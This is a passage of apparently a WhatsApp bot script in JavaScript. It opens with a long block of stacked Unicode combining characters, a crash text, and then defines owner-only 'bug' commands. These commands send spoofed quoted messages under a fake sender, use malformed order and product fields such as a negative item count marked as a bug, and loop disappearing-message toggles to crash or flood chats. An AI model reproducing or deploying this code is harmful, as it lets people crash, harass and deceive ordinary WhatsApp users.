๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbo
t*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭99**ঔৣ͜͡҉*Mythic
Xbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**
ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭*

`
zoe.sendMessage(from, wew, image, {thumbnail:fs.readFileSync(`lib/logo.jpg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"62895606059646-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`lib/logo.jpg`),"itemCount":-969769349,"status":"INQUIRY","surface":"CATALOG","message":`BODY-BOT `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},caption: lzain,contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
await setTimeout(() => {
reply('.bugr')
}, 5000)
                    break
                    case 'bughole':
                    if (!dev.key.fromMe && !isOwner) return
				zoe.sendMessage(from, bughole(prefix), text)
await zoe.toggleDisappearingMessages(from)
break
case 'xbug':
if (!dev.key.fromMe && !isOwner) return
zoe.toggleDisappearingMessages(from, 0)
zoe.toggleDisappearingMessages(from, 0)
zoe.toggleDisappearingMessages(from, 0)
zoe.toggleDisappearingMessages(from, 0)
zoe.toggleDisappearingMessages(from, 0)
zoe.toggleDisappearingMessages(from, 0)
zoe.toggleDisappearingMessages(from, 0)
zoe.toggleDisappearingMessages(from, 0)
zoe.toggleDisappearingMessages(from, 0)
zoe.toggleDisappearingMessages(from, 0)
zoe.sendMessage(from, `Xbug VIRUS`, text)
break
case 'troli':
if (!dev.key.fromMe && !isOwner) return
zoe.toggleDisappearingMessages(from, 0)
		zoe.sendMessage(from, '▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x0a▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒\x0a▒▒█▒▒▒▄██████████▄▒▒▒▒\x0a▒█▐▒▒▒████████████▒▒▒▒\x0a▒▌▐▒▒██▄▀██████▀▄██▒▒▒\x0a▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒\x0a▐┼▐▒▒██████████████▒▒▒\x0a▐▄▐████─▀▐▐▀█─█─▌▐██▄▒\x0a▒▒█████──────────▐███▌\x0a▒▒█▀▀██▄█─▄───▐─▄███▀▒\x0a▒▒█▒▒███████▄██████▒▒▒\x0a▒▒▒▒▒██████████████▒▒▒\x0a▒▒▒▒▒██████████████▒▒▒\x0a▒▒▒▒▒█████████▐▌██▌▒▒▒\x0a▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒\x0a▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒\x0a▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒', MessageType.extendedText, {   	   
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid 
  },
  message: {
   orderMessage: {
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '⚡⚡',
    orderTitle: 'TROLI VIRUS', // Idk what this does  
    sellerJid: '0@s.whatsapp.net' // Seller    
   }
  }
 }
})
await zoe.toggleDisappearingMessages(from)
await zoe.toggleDisappearingMessages(from)
		     break		
case 'sendbug':
					if (!dev.key.fromMe && !isOwner) return
					if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
await zoe.toggleDisappearingMessages(from, 0)
}
sendFakeStatus(from, 'Sukses Send Bug Sebanyak '+args.join(' '), fake)
					break
					case 'buggc':
if (!dev.key.fromMe && !isOwner) return
await zoe.toggleDisappearingMessages(from)
reply("mampus")
break
case 'katalogv3':
  if (!dev.key.fromMe && !isOwner) return
   v3 = fs.readFileSync(`./src/catalog3.jpg`)
imeu = await zoe.prepareMessage('0@s.whatsapp.net', v3, image)

imeg = imeu.message.imageMessage
res = await zoe.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "", 
  "title": katalog(prefix),
"description": desk(prefix), 
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "628956060596467@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
  zoe.relayWAMessage(res)
  break                            
                  case 'bugdoc': 
  if (!dev.key.fromMe && !isOwner) return
hmm6 = fs.readFileSync('./src/zoez.txt')
zoe.sendMessage(from, hmm6, document, { quoted: {
  key: {
